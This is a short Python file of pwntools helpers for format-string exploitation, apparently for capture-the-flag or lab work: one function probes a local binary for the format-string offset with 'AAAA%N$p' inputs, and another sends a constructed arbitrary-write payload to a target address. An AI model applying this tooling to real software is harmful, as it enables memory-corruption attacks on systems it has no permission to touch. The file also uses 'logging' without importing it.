from pwn import *
import fmtstr_payload

'''
Assuming a format string vulnerability, attempts to find the start of the input buffer from stdin
'''
def find_fmtbuf_stdin(binary_name:str, iter:int) -> bool:
    for i in range(iter):

        io = process(f'./{binary_name}')
        io.sendline('AAAA' + '%{}$p'.format(i))
        try:
            r = io.recvline(timeout=0.1)
            print(r)
            if b'4141' in r: # at least 2 A's in the pointer
                return True
        except Exception as e:
            logging.error(e)
            pass
        io.close()

    return False

'''
Wrapper to construct payload + send to stdin
'''
def write_payload_stdin(io: tube, fmtstr_offset: int, target_addr: int, to_write: int, word_padding: int) -> None:
    try:
        io.sendline(fmtstr_payload.construct(fmtstr_offset, target_addr, to_write, word_padding))
        io.close()
    except Exception as e:
        logging.error(e)
        pass